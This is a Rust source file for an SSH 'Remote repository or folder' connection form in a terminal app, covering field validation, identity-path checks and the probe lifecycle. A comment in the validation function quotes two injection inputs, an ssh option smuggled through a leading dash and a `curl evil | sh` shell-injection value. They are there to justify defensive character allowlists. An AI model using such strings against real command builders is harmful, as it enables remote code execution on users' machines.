//! "Remote Repository or Folder…" connection form (repo mode).
//!
//! Collects the five fields an SSH connection needs (server, port, user,
//! identity file, remote path), validates them locally, and hands them to the
//! workspace, which runs the add-time probe. The form owns input collection and
//! the probing/failure *visual* lifecycle only — it has no network dependency,
//! so its validation and state transitions are testable without a window.

use std::cell::RefCell;
use std::path::{Path, PathBuf};

use warp_core::ui::theme::color::internal_colors;
use warpui::elements::{
    Border, ChildView, ConstrainedBox, Container, CornerRadius, CrossAxisAlignment, Element,
    Fill as ElementFill, Flex, MainAxisAlignment, MainAxisSize, MouseStateHandle, Padding,
    ParentElement, Radius, Shrinkable, Text,
};
use warpui::fonts::{Properties, Weight};
use warpui::keymap::FixedBinding;
use warpui::platform::Cursor;
use warpui::ui_components::button::ButtonVariant;
use warpui::ui_components::components::{Coords, UiComponent, UiComponentStyles};
use warpui::{AppContext, Entity, SingletonEntity, TypedActionView, View, ViewContext, ViewHandle};

use crate::appearance::Appearance;
use crate::editor::{EditorView, Event as EditorEvent, SingleLineEditorOptions};
use crate::modal::ModalAction;

/// Registers keybindings for the remote connection modal (ESC to close).
pub fn init(app: &mut AppContext) {
    use warpui::keymap::macros::*;
    app.register_fixed_bindings(vec![FixedBinding::new(
        "escape",
        RemoteConnectionModalAction::Escape,
        id!("RemoteConnectionModal"),
    )]);
}

/// Gap between fields in the form.
const SECTION_GAP: f32 = 12.;
/// Gap between a field label and its editor below.
const LABEL_BOTTOM_MARGIN: f32 = 4.;
const CONTENT_HORIZONTAL_PADDING: f32 = 24.;
const HEADER_PADDING_TOP: f32 = 24.;
const HEADER_PADDING_BOTTOM: f32 = 12.;
const HEADER_TITLE_FONT_SIZE: f32 = 16.;
const BODY_BOTTOM_PADDING: f32 = 16.;
const FOOTER_VERTICAL_PADDING: f32 = 12.;
const FOOTER_BUTTON_HEIGHT: f32 = 32.;
const FOOTER_BUTTON_HORIZONTAL_PADDING: f32 = 12.;
const FOOTER_BUTTON_GAP: f32 = 8.;
const FOOTER_BUTTON_RADIUS: Radius = Radius::Pixels(4.);
const ESC_BADGE_HEIGHT: f32 = 14.;
const ESC_BADGE_FONT_SIZE: f32 = 10.;
const ESC_BADGE_CORNER_RADIUS: Radius = Radius::Pixels(3.);
const CLOSE_ICON_SIZE: f32 = 14.;
const ERROR_FONT_SIZE: f32 = 12.;

const OPTION_LEADING_DASH_ERROR: &str = "Cannot start with '-'";
const PORT_ERROR: &str = "Port must be a number between 1 and 65535";
const IDENTITY_MISSING_ERROR: &str = "No key file at that path";
const SERVER_CHARSET_ERROR: &str = "Only letters, digits, and . - _ : % [ ]";
const USER_CHARSET_ERROR: &str = "Only letters, digits, and . - _ \\ $";

/// Characters a hostname field may contain: DNS names, IPv4 literals, and IPv6
/// literals (hex plus `:`, an optional `%zone`, and the brackets some users
/// type by hand).
fn is_server_char(ch: char) -> bool {
    // No brackets: `normalize_server` has already unwrapped the one place they
    // are meaningful, so anything still carrying them is not a host `ssh` can
    // dial and the user is better off being told than having it rewritten.
    ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_' | ':' | '%')
}

/// Characters a username field may contain. `useradd` shapes plus `\` for
/// `DOMAIN\user` and the trailing `$` of a machine account.
fn is_user_char(ch: char) -> bool {
    ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_' | '\\' | '$')
}

/// The five fields as typed, before any interpretation.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct RemoteConnectionForm {
    pub server: String,
    pub port: String,
    pub user: String,
    pub identity: String,
    pub path: String,
}

/// Per-field validation, recomputed on every render.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct RemoteConnectionValidation {
    pub server_error: Option<&'static str>,
    pub port_error: Option<&'static str>,
    pub user_error: Option<&'static str>,
    pub identity_error: Option<&'static str>,
    pub path_error: Option<&'static str>,
    /// Port to connect on, defaulting to 22 for a blank field (R2).
    pub port_number: u16,
    /// Every required field has content. Tracked apart from the errors so an
    /// untouched empty form disables submit without shouting at the user.
    pub complete: bool,
}

impl RemoteConnectionValidation {
    pub fn can_submit(&self) -> bool {
        self.complete
            && self.server_error.is_none()
            && self.port_error.is_none()
            && self.user_error.is_none()
            && self.identity_error.is_none()
            && self.path_error.is_none()
    }
}

/// Expand a leading `~` in a *local* identity path.
///
/// The identity is a private key on this machine consumed by `ssh -i`, so its
/// `~` resolves client-side. Only the *remote* path's `~` resolves on the host,
/// at probe time.
pub fn expand_local_identity_path(identity: &str, home: Option<&Path>) -> PathBuf {
    let identity = identity.trim();
    let Some(home) = home else {
        return PathBuf::from(identity);
    };
    match identity.strip_prefix('~') {
        Some(rest) => home.join(rest.trim_start_matches('/')),
        None => PathBuf::from(identity),
    }
}

/// Whether a typed identity path fails to resolve on this machine.
///
/// Touches the filesystem, so it must not be called from a render path: an
/// identity under a stalled network mount (sshfs, an unreachable SMB share)
/// makes `exists()` block for as long as the mount takes to time out, and
/// `render` runs on every keystroke. Callers memoize the answer on the identity
/// text and only recheck when it changes.
///
/// An empty identity is not missing — the field is optional, because an
/// ssh-agent may already hold the key.
pub fn check_identity_missing(identity: &str, home: Option<&Path>) -> bool {
    let identity = identity.trim();
    !identity.is_empty() && !expand_local_identity_path(identity, home).exists()
}

/// The server field as `ssh` should see it.
///
/// A user copying an IPv6 address out of a URL or an `ssh` example brings the
/// brackets with it. `[::1]` is bracket syntax for "this is a host, the colons
/// are not a port" — it is not part of the address, and `ssh` does not accept
/// it as a destination. The registry key re-adds brackets itself when it needs
/// them, so storing them here would round-trip a host of `[::1]` into a
/// destination of `[[::1]]`.
pub fn normalize_server(server: &str) -> &str {
    let server = server.trim();
    match server.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
        // Only when what is inside actually looks like an IPv6 literal, so a
        // hostname that genuinely begins with a bracket is left to fail the
        // charset check rather than being silently rewritten.
        Some(inner) if inner.contains(':') => inner,
        _ => server,
    }
}

/// Validate the form against this machine.
///
/// Pure: every check here reads the form's own text. `identity_missing` comes
/// from [`check_identity_missing`], which does the one filesystem lookup the
/// form needs, so this stays safe to call from `render`.
pub fn validate(form: &RemoteConnectionForm, identity_missing: bool) -> RemoteConnectionValidation {
    let server = normalize_server(&form.server);
    let user = form.user.trim();
    let port = form.port.trim();
    let identity = form.identity.trim();
    let path = form.path.trim();

    // KTD10, two distinct hazards on the same two fields.
    //
    // A leading `-` reaches ssh's argv as an option (`-oProxyCommand=…`), which
    // BatchMode does not stop. The `--` fence covers the destination; this
    // stops the field earlier.
    //
    // A shell metacharacter is worse: `remote_ssh_command` builds a string that
    // is typed into the *local* shell, so `h; curl evil | sh` would execute
    // here. That string quotes every field, which is the actual fix — this
    // allowlist is defense in depth for any future sink that forgets to, and it
    // rejects the payload at the point the user can still see why.
    let server_error = if server.starts_with('-') {
        Some(OPTION_LEADING_DASH_ERROR)
    } else if !server.is_empty() && !server.chars().all(is_server_char) {
        Some(SERVER_CHARSET_ERROR)
    } else {
        None
    };
    let user_error = if user.starts_with('-') {
        Some(OPTION_LEADING_DASH_ERROR)
    } else if !user.is_empty() && !user.chars().all(is_user_char) {
        Some(USER_CHARSET_ERROR)
    } else {
        None
    };

    let (port_number, port_error) = if port.is_empty() {
        (repo_mode::DEFAULT_SSH_PORT, None)
    } else {
        match port.parse::<u16>() {
            Ok(parsed) if parsed > 0 => (parsed, None),
            _ => (repo_mode::DEFAULT_SSH_PORT, Some(PORT_ERROR)),
        }
    };

    // The identity is optional — an ssh-agent may already hold the key — but a
    // path that was typed has to exist, or the probe fails for a reason the
    // form could have named up front.
    //
    // Whether it exists is *not* answered here: that needs the filesystem, and
    // this function runs on the render path. `identity_missing` is supplied by
    // `check_identity`, which the caller memoizes on the identity text.
    let identity_error =
        (!identity.is_empty() && identity_missing).then_some(IDENTITY_MISSING_ERROR);

    RemoteConnectionValidation {
        server_error,
        port_error,
        user_error,
        identity_error,
        // Remote-path validity is the probe's answer to give (R8), not this
        // machine's: only emptiness is knowable here.
        path_error: None,
        port_number,
        complete: !server.is_empty() && !user.is_empty() && !path.is_empty(),
    }
}

/// Where the form is in the add cycle.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub enum RemoteConnectionModalState {
    #[default]
    Editing,
    /// Submitted; the probe is in flight and the form waits (R7 — it stays
    /// open rather than registering something unverified).
    Probing,
    /// The probe rejected the connection; the reason is shown and the fields
    /// are live again.
    Failed(String),
}

/// Editing → Probing → (Failed | closed) lifecycle.
///
/// Kept apart from the view so the cancel-during-probe guard is testable
/// without a window: every probe carries the token it started with, and a
/// result whose token has been superseded — the user cancelled, closed, or
/// resubmitted — is dropped instead of resurrecting a torn-down form.
#[derive(Clone, Debug, Default)]
pub struct RemoteConnectionLifecycle {
    state: RemoteConnectionModalState,
    token: u64,
}

impl RemoteConnectionLifecycle {
    pub fn state(&self) -> &RemoteConnectionModalState {
        &self.state
    }

    /// False while a probe is in flight, so a double-click cannot spawn two
    /// connections to the same host.
    pub fn can_start_probe(&self) -> bool {
        !matches!(self.state, RemoteConnectionModalState::Probing)
    }

    /// Enter `Probing` and return the token to carry with the probe.
    pub fn begin_probe(&mut self) -> u64 {
        self.token = self.token.wrapping_add(1);
        self.state = RemoteConnectionModalState::Probing;
        self.token
    }

    /// Show `reason` and hand the fields back. `false` when `token` is stale,
    /// in which case nothing changes.
    pub fn fail(&mut self, token: u64, reason: String) -> bool {
        if token != self.token || !matches!(self.state, RemoteConnectionModalState::Probing) {
            return false;
        }
        self.state = RemoteConnectionModalState::Failed(reason);
        true
    }

    /// Back to a clean editing state (open, cancel, or a successful add). Any
    /// probe still in flight is invalidated.
    pub fn reset(&mut self) {
        self.token = self.token.wrapping_add(1);
        self.state = RemoteConnectionModalState::Editing;
    }
}

/// Body view for the remote connection modal. The workspace wraps this in a
/// `Modal<RemoteConnectionModal>`.
pub struct RemoteConnectionModal {
    server_editor: ViewHandle<EditorView>,
    port_editor: ViewHandle<EditorView>,
    user_editor: ViewHandle<EditorView>,
    identity_editor: ViewHandle<EditorView>,
    path_editor: ViewHandle<EditorView>,
    lifecycle: RemoteConnectionLifecycle,
    cancel_button_mouse_state: MouseStateHandle,
    add_button_mouse_state: MouseStateHandle,
    close_button_mouse_state: MouseStateHandle,
    /// Last identity text checked against the filesystem, and the answer.
    ///
    /// `render` needs to know whether the identity resolves, but the lookup can
    /// block on a stalled network mount and `render` runs on every keystroke.
    /// Cached on the exact text so the disk is touched once per edit rather than
    /// once per frame.
    identity_check: RefCell<Option<(String, bool)>>,
}

pub enum RemoteConnectionModalEvent {
    Close,
    /// The user submitted a valid connection. The workspace probes it and
    /// reports back through [`RemoteConnectionModal::on_probe_failed`],
    /// carrying `token` so a result the form has moved past is dropped.
    Submit {
        token: u64,
        server: String,
        port: u16,
        user: String,
        identity: String,
        path: String,
    },
}

#[derive(Clone, Copy, Debug)]
pub enum RemoteConnectionModalAction {
    Cancel,
    Add,
    Escape,
}

impl RemoteConnectionModal {
    pub fn new(ctx: &mut ViewContext<Self>) -> Self {
        Self {
            server_editor: Self::build_field("192.168.1.10", ctx),
            port_editor: Self::build_field("Defaults to 22", ctx),
            user_editor: Self::build_field("root", ctx),
            identity_editor: Self::build_field("~/.ssh/id_ed25519 (optional)", ctx),
            path_editor: Self::build_field("~/projects/my-app", ctx),
            lifecycle: RemoteConnectionLifecycle::default(),
            cancel_button_mouse_state: Default::default(),
            add_button_mouse_state: Default::default(),
            close_button_mouse_state: Default::default(),
            identity_check: RefCell::new(None),
        }
    }

    fn build_field(
        placeholder: &'static str,
        ctx: &mut ViewContext<Self>,
    ) -> ViewHandle<EditorView> {
        let editor = ctx.add_typed_action_view(move |ctx| {
            let mut editor = EditorView::single_line(SingleLineEditorOptions::default(), ctx);
            editor.set_placeholder_text(placeholder, ctx);
            editor
        });
        ctx.subscribe_to_view(&editor, |me, _, event, ctx| match event {
            EditorEvent::Enter => me.try_submit(ctx),
            EditorEvent::Escape => ctx.emit(RemoteConnectionModalEvent::Close),
            EditorEvent::Edited(_) => {
                // Typing after a rejection clears the banner: the reason
                // described the connection the user has now changed.
                if matches!(me.lifecycle.state(), RemoteConnectionModalState::Failed(_)) {
                    me.lifecycle.reset();
                }
                ctx.notify();
            }
            _ => {}
        });
        editor
    }

    /// Called by the workspace before making the modal visible. Clears the
    /// fields and any banner left from a previous attempt.
    pub fn on_open(&mut self, ctx: &mut ViewContext<Self>) {
        self.lifecycle.reset();
        for editor in [
            self.server_editor.clone(),
            self.port_editor.clone(),
            self.user_editor.clone(),
            self.identity_editor.clone(),
            self.path_editor.clone(),
        ] {
            editor.update(ctx, |editor, ctx| {
                editor.clear_buffer_and_reset_undo_stack(ctx);
            });
        }
        ctx.focus(&self.server_editor);
        ctx.notify();
    }

    /// Called by the workspace when the modal is dismissed. Invalidates any
    /// probe still in flight so its result cannot reopen the form.
    pub fn on_close(&mut self, ctx: &mut ViewContext<Self>) {
        self.lifecycle.reset();
        ctx.notify();
    }

    /// Covers R7: the probe rejected the connection, so the form stays open and
    /// names the reason. A stale `token` is ignored.
    pub fn on_probe_failed(
        &mut self,
        token: u64,
        reason: String,
        ctx: &mut ViewContext<Self>,
    ) -> bool {
        let applied = self.lifecycle.fail(token, reason);
        if applied {
            ctx.notify();
        }
        applied
    }

    fn form(&self, app: &AppContext) -> RemoteConnectionForm {
        RemoteConnectionForm {
            server: self.server_editor.as_ref(app).buffer_text(app),
            port: self.port_editor.as_ref(app).buffer_text(app),
            user: self.user_editor.as_ref(app).buffer_text(app),
            identity: self.identity_editor.as_ref(app).buffer_text(app),
            path: self.path_editor.as_ref(app).buffer_text(app),
        }
    }

    /// `check_identity_missing` for the current identity, from cache when the
    /// text has not changed since the last lookup.
    fn identity_missing(&self, identity: &str) -> bool {
        if let Some((checked, missing)) = self.identity_check.borrow().as_ref()
            && checked == identity
        {
            return *missing;
        }
        let missing = check_identity_missing(identity, dirs::home_dir().as_deref());
        *self.identity_check.borrow_mut() = Some((identity.to_string(), missing));
        missing
    }

    fn try_submit(&mut self, ctx: &mut ViewContext<Self>) {
        if !self.lifecycle.can_start_probe() {
            return;
        }
        let form = self.form(ctx);
        // Submitting is a user action, not a frame: check for real rather than
        // trusting a cache that predates an edit the editor has not reported.
        let identity_missing = check_identity_missing(&form.identity, dirs::home_dir().as_deref());
        *self.identity_check.borrow_mut() = Some((form.identity.clone(), identity_missing));
        let validation = validate(&form, identity_missing);
        if !validation.can_submit() {
            return;
        }
        let token = self.lifecycle.begin_probe();
        ctx.emit(RemoteConnectionModalEvent::Submit {
            token,
            server: normalize_server(&form.server).to_string(),
            port: validation.port_number,
            user: form.user.trim().to_string(),
            identity: form.identity.trim().to_string(),
            path: form.path.trim().to_string(),
        });
        ctx.notify();
    }

    fn render_field(
        &self,
        label: &str,
        editor: &ViewHandle<EditorView>,
        error: Option<&'static str>,
        first: bool,
        appearance: &Appearance,
    ) -> Box<dyn Element> {
        let theme = appearance.theme();
        let mut column = Flex::column()
            .with_main_axis_size(MainAxisSize::Min)
            .with_cross_axis_alignment(CrossAxisAlignment::Stretch)
            .with_child(
                Container::new(
                    Text::new_inline(
                        label.to_string(),
                        appearance.ui_font_family(),
                        appearance.ui_font_size(),
                    )
                    .with_color(theme.sub_text_color(theme.background()).into())
                    .finish(),
                )
                .with_margin_bottom(LABEL_BOTTOM_MARGIN)
                .finish(),
            )
            .with_child(ChildView::new(editor).finish());
        if let Some(error) = error {
            column.add_child(
                Container::new(
                    Text::new_inline(
                        error.to_string(),
                        appearance.ui_font_family(),
                        ERROR_FONT_SIZE,
                    )
                    .with_color(theme.ui_error_color())
                    .finish(),
                )
                .with_margin_top(LABEL_BOTTOM_MARGIN)
                .finish(),
            );
        }
        let container = Container::new(column.finish());
        if first {
            container.finish()
        } else {
            container.with_margin_top(SECTION_GAP).finish()
        }
    }
}

impl Entity for RemoteConnectionModal {
    type Event = RemoteConnectionModalEvent;
}

impl View for RemoteConnectionModal {
    fn ui_name() -> &'static str {
        "RemoteConnectionModal"
    }

    fn render(&self, app: &AppContext) -> Box<dyn Element> {
        let appearance = Appearance::as_ref(app);
        let theme = appearance.theme();
        let form = self.form(app);
        let validation = validate(&form, self.identity_missing(&form.identity));
        let probing = matches!(self.lifecycle.state(), RemoteConnectionModalState::Probing);
        let can_submit = validation.can_submit() && !probing;

        // ── Header ──────────────────────────────────────────────────────
        let header = {
            let title = Text::new_inline(
                "Remote repository or folder".to_string(),
                appearance.ui_font_family(),
                HEADER_TITLE_FONT_SIZE,
            )
            .with_color(theme.active_ui_text_color().into())
            .with_style(Properties::default().weight(Weight::Bold))
            .finish();

            let esc_badge = Container::new(
                ConstrainedBox::new(
                    Text::new_inline(
                        "ESC".to_string(),
                        appearance.ui_font_family(),
                        ESC_BADGE_FONT_SIZE,
                    )
                    .with_color(theme.foreground().into())
                    .finish(),
                )
                .with_height(ESC_BADGE_HEIGHT)
                .finish(),
            )
            .with_horizontal_padding(2.)
            .with_background(internal_colors::neutral_2(theme))
            .with_corner_radius(CornerRadius::with_all(ESC_BADGE_CORNER_RADIUS))
            .finish();

            let close_icon = ConstrainedBox::new(
                warp_core::ui::Icon::X
                    .to_warpui_icon(theme.sub_text_color(theme.background()))
                    .finish(),
            )
            .with_width(CLOSE_ICON_SIZE)
            .with_height(CLOSE_ICON_SIZE)
            .finish();

            let close_button = Flex::row()
                .with_cross_axis_alignment(CrossAxisAlignment::Center)
                .with_spacing(2.)
                .with_child(close_icon)
                .with_child(esc_badge)
                .finish();

            let close_hoverable = warpui::elements::Hoverable::new(
                self.close_button_mouse_state.clone(),
                move |_state| close_button,
            )
            .on_click(|ctx, _, _| {
                ctx.dispatch_typed_action(ModalAction::Close);
            })
            .with_cursor(Cursor::PointingHand)
            .finish();

            Container::new(
                Flex::row()
                    .with_main_axis_size(MainAxisSize::Max)
                    .with_main_axis_alignment(MainAxisAlignment::SpaceBetween)
                    .with_cross_axis_alignment(CrossAxisAlignment::Center)
                    .with_child(Shrinkable::new(1., title).finish())
                    .with_child(close_hoverable)
                    .finish(),
            )
            .with_padding(
                Padding::uniform(0.)
                    .with_top(HEADER_PADDING_TOP)
                    .with_bottom(HEADER_PADDING_BOTTOM)
                    .with_left(CONTENT_HORIZONTAL_PADDING)
                    .with_right(CONTENT_HORIZONTAL_PADDING),
            )
            .finish()
        };

        // ── Form body ───────────────────────────────────────────────────
        let mut body = Flex::column()
            .with_main_axis_size(MainAxisSize::Min)
            .with_cross_axis_alignment(CrossAxisAlignment::Stretch);
        body.add_child(self.render_field(
            "Server",
            &self.server_editor,
            validation.server_error,
            true,
            appearance,
        ));
        body.add_child(self.render_field(
            "Port",
            &self.port_editor,
            validation.port_error,
            false,
            appearance,
        ));
        body.add_child(self.render_field(
            "User",
            &self.user_editor,
            validation.user_error,
            false,
            appearance,
        ));
        body.add_child(self.render_field(
            "Identity file",
            &self.identity_editor,
            validation.identity_error,
            false,
            appearance,
        ));
        body.add_child(self.render_field(
            "Path",
            &self.path_editor,
            validation.path_error,
            false,
            appearance,
        ));

        // Probe status line: "Connecting…" while the probe runs, the mapped
        // reason once it fails (R7). Nothing is registered either way.
        let status = match self.lifecycle.state() {
            RemoteConnectionModalState::Editing => None,
            RemoteConnectionModalState::Probing => Some((
                "Connecting…".to_string(),
                theme.sub_text_color(theme.background()).into(),
            )),
            RemoteConnectionModalState::Failed(reason) => {
                Some((reason.clone(), theme.ui_error_color()))
            }
        };
        if let Some((message, color)) = status {
            body.add_child(
                Container::new(
                    Text::new_inline(message, appearance.ui_font_family(), ERROR_FONT_SIZE)
                        .with_color(color)
                        .finish(),
                )
                .with_margin_top(SECTION_GAP)
                .finish(),
            );
        }

        let body_container = Container::new(body.finish())
            .with_padding(
                Padding::uniform(0.)
                    .with_left(CONTENT_HORIZONTAL_PADDING)
                    .with_right(CONTENT_HORIZONTAL_PADDING)
                    .with_bottom(BODY_BOTTOM_PADDING),
            )
            .finish();

        // ── Footer ──────────────────────────────────────────────────────
        let text_button_base = UiComponentStyles {
            font_size: Some(appearance.ui_font_size() + 2.),
            font_weight: Some(Weight::Semibold),
            height: Some(FOOTER_BUTTON_HEIGHT),
            padding: Some(
                Coords::uniform(0.)
                    .left(FOOTER_BUTTON_HORIZONTAL_PADDING)
                    .right(FOOTER_BUTTON_HORIZONTAL_PADDING),
            ),
            background: Some(ElementFill::None),
            border_width: Some(0.),
            border_radius: Some(CornerRadius::with_all(FOOTER_BUTTON_RADIUS)),
            ..Default::default()
        };
        let main_text = theme.main_text_color(theme.background());

        let cancel_button = appearance
            .ui_builder()
            .button(ButtonVariant::Text, self.cancel_button_mouse_state.clone())
            .with_text_label("Cancel".to_string())
            .with_style(text_button_base)
            .with_style(UiComponentStyles {
                font_color: Some(main_text.into()),
                ..Default::default()
            })
            .build()
            .on_click(|ctx, _, _| {
                ctx.dispatch_typed_action(RemoteConnectionModalAction::Cancel);
            })
            .finish();

        let add_button = {
            let font_color = if can_submit {
                main_text
            } else {
                theme.disabled_text_color(theme.background())
            };
            let mut builder = appearance
                .ui_builder()
                .button(ButtonVariant::Text, self.add_button_mouse_state.clone())
                .with_text_label("Add".to_string())
                .with_style(text_button_base)
                .with_style(UiComponentStyles {
                    font_color: Some(font_color.into()),
                    ..Default::default()
                });
            if !can_submit {
                builder = builder.with_cursor(None);
                builder.build().disable().finish()
            } else {
                builder
                    .build()
                    .on_click(|ctx, _, _| {
                        ctx.dispatch_typed_action(RemoteConnectionModalAction::Add);
                    })
                    .finish()
            }
        };

        let footer = Container::new(
            Container::new(
                Flex::row()
                    .with_main_axis_size(MainAxisSize::Max)
                    .with_main_axis_alignment(MainAxisAlignment::End)
                    .with_cross_axis_alignment(CrossAxisAlignment::Center)
                    .with_spacing(FOOTER_BUTTON_GAP)
                    .with_child(cancel_button)
                    .with_child(add_button)
                    .finish(),
            )
            .with_padding(
                Padding::uniform(FOOTER_VERTICAL_PADDING)
                    .with_left(CONTENT_HORIZONTAL_PADDING)
                    .with_right(CONTENT_HORIZONTAL_PADDING),
            )
            .finish(),
        )
        .with_border(Border::top(1.).with_border_fill(theme.outline()))
        .finish();

        Flex::column()
            .with_main_axis_size(MainAxisSize::Min)
            .with_cross_axis_alignment(CrossAxisAlignment::Stretch)
            .with_child(header)
            .with_child(body_container)
            .with_child(footer)
            .finish()
    }
}

impl TypedActionView for RemoteConnectionModal {
    type Action = RemoteConnectionModalAction;

    fn handle_action(&mut self, action: &Self::Action, ctx: &mut ViewContext<Self>) {
        match action {
            RemoteConnectionModalAction::Cancel | RemoteConnectionModalAction::Escape => {
                ctx.emit(RemoteConnectionModalEvent::Close);
            }
            RemoteConnectionModalAction::Add => self.try_submit(ctx),
        }
    }
}

#[cfg(test)]
#[path = "remote_connection_modal_tests.rs"]
mod tests;
